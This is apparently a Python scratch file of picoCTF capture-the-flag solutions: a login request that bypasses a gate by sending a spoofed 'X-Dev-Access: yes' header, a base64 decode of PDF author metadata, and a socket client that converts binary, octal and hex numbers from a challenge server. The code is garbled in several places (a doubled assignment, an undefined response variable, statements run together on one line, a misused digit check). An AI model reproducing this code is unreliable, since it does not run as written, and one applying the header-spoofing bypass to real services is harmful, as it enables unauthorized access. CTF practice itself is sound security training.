import requests
import base64
from pypdf import PdfReader
# crack the gate:
PORT=6666 # insert the right port here 
url = f'http://amiable-citadel.picoctf.net:{PORT}'
h = h={'Content-Type': 'application/json', 'X-Dev-Acc\ess':'yes'}
payload={'email':'ctf-player@picoctf.org', 'password':'PASSWORD'}
requests.post(url,json=payload,headers=h)
print(r.status_code)
print(r.text)

# read pdf metadata and decode it from base64
r = PdfReader('path_t_pdf')
meta = r.metadata
print(meta)
d = meta.author
print(base64.b64decode(d))

import socket
HOST = 'fickle-tempest.picoctf.net' 
PORT = 60486 
def to_ascii(n, b): 
	return chr(int(n,b)) 
def interactive_netcat_client(host, port): 
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket: 
		try: 
			client_socket.connect((host, port))
		except Exception as e:
			print(f"[-] Connection failed: {e}")
			return 
		while True:
			data_bytes = client_socket.recv(4096) 
			if not data_bytes: 
				print("Server closed connection.") 
				break 
			data_str = data_bytes.decode('utf-8').strip()
			print(f"Received: {data_str}") 
			first = '' for d in data_str.split('\n'): 
			if 'Please' in d: 
				#print(d) 
				for c in d.split(' '): 
					if len(c)>1 and (c[0] == '0' or c[0] == '1'): 
						first+= to_ascii(c,2) 
					elif len(c)>1 and c[0] == 'o': 
						first+=to_ascii(c[1:],8) 
					elif len(c)>1 and c.isdigit(): 
						first+=bytes.fromhex(c).decode('ascii') 
			print(f"value = {first}") 
			data_bytes = (first + '\n').encode('utf-8') 
			client_socket.sendall(data_bytes) 
if __name__ == '__main__':
	interactive_netcat_client(HOST, PORT)
